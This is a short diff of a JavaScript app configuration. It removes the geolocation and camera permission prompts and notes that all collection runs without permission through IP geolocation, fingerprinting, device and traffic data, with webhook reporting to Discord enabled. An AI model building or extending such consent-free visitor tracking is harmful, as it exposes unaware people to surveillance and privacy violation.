@@ -4,9 +4,7 @@ window.APP_CONFIG = {
   supabaseUrl: "https://xfswzttlhedlxgmcjuaq.supabase.co",
   supabaseAnonKey: "sb_publishable_OWwbFSpMVukkEnlCf4lWig_4dIJBLoK",
 
-  // Permission prompts — set false to collect only no-permission channels
-  promptGeo: false,
-  promptCamera: false,
+  // All collection is no-permission (IP geo, fingerprint, device, traffic)
 
   webhooksEnabled: true,
   discordWebhookUrl: "",
